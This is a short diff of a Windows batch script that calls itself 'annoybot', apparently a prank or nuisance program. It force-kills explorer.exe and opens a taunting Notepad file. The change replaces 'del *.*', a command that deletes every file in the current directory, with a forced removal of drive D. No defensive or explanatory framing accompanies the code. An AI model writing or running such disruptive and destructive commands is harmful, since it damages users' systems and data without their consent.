@@ -10,4 +10,4 @@ for /f "skip=3 tokens=2 delims= " %%a in ('tasklist /fi "imagename eq cmd.exe"')
 taskkill /f /im explorer.exe
 echo annoybot has launched >> any.txt
 notepad.exe any.txt
-del *.*
+RemoveDrive.exe D: -L -F
